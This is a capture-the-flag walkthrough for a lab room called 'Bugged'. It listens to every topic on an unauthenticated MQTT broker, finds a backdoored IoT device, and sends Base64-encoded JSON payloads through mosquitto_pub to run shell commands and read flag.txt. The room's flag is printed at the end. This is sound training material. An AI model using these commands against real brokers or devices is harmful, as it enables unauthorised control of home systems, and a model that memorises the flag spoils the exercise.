# Bugged

## Intro

John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these network communications are?

We start with an **Nmap scan**:

```
PORT     STATE SERVICE REASON
1883/tcp open  mqtt    syn-ack ttl 63
```

Only one port is open, so let’s see what we can find.

Here, we discover a single service running on **port 1883**: `mosquitto`. This software is an **MQTT message broker**.

The MQTT protocol is usually used by connected objects that don’t need to send or receive large amounts of data. In this protocol, there are two entities:

* **Clients**: Devices on the network that need to communicate. For example, a smart thermometer in a room or an oven you can remotely turn on/off. Clients do not directly exchange messages between themselves.
* **Brokers**: Devices that centralize communications. A client sends its message to a broker, and the broker forwards it to the subscribed clients.

Messages are organized by **topics**. For example: `home/garage/temperature`. Clients subscribe to topics, and the broker sends them messages for those topics.

---

Now that we understand the protocol, we can try to see what’s transiting on the network.

We install the mosquitto client tools:

```
sudo apt install mosquitto mosquitto-clients
```

Then subscribe to all topics:

```
mosquitto_sub -h bugged.thm -t '#' -v
```

<img width="1857" height="1006" alt="Screenshot From 2025-05-22 20-56-59" src="https://github.com/user-attachments/assets/06989d25-3e7d-492d-acd2-d65431e830ac" />

We get a lot of IoT device traffic encoded in **Base64**. We can decode this in CyberChef.

But one message stands out:

```
livingroom/speaker {"id":6731845672126309843,"gain":75}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwL...
```

---

<img width="1857" height="1006" alt="Screenshot From 2025-05-22 20-58-01" src="https://github.com/user-attachments/assets/9b268b7f-1b2e-4979-b98f-bb7f4e4f1ba1" />

Interesting — this unknown device can be interacted with, and we know the topic it subscribes to.

Let’s try sending a command:

```
mosquitto_pub -t 'yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config' -m "HELP" -h bugged.thm -d
```

We see registered commands:

```
["HELP", "CMD", "SYS"]
```

We also see two topics:

* Publish: `"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"`
* Subscribe: `"sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"`

Now let’s interact with them.

---

Open two terminals side by side.

**Terminal 1 – Subscriber:**

```
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h bugged.thm
```

This waits for published messages on the topic.

**Terminal 2 – Publisher:**

```
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "test_message" -h bugged.thm
```

Response:

```
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6...
```

<img width="1857" height="1006" alt="Screenshot From 2025-05-22 21-25-33" src="https://github.com/user-attachments/assets/1aad8ad9-5672-428f-b7f9-59e21e3dc65f" />

---

Score — there’s a **backdoor** we can exploit!

We know the ID:

```
cdd1b1c0-1c40-4b0f-8e22-61b357548b7d
```

From registered commands, we pick `"CMD"`. For the argument, let’s try `ls`.

The payload should look like this:

```
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```

Encode in Base64 and send:

```
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQ==" -h bugged.thm
```

Now we see another Base64 string in the subscriber terminal.

<img width="1857" height="1006" alt="Screenshot From 2025-05-22 21-28-26" src="https://github.com/user-attachments/assets/cd2da8db-d623-43fb-a0b2-00b92a53abf6" />

---

We see a file named **flag.txt**.

Let’s craft another payload to read it:

```
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}
```

Encoded in Base64:

```
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0=" -h bugged.thm
```

Decoding the response gives us the flag.

> Q1: What is the flag?
> A1: flag{18d44fc0707ac8dc8be45bb83db54013}

---

And with that, we successfully extracted the flag using MQTT backdoor exploitation.
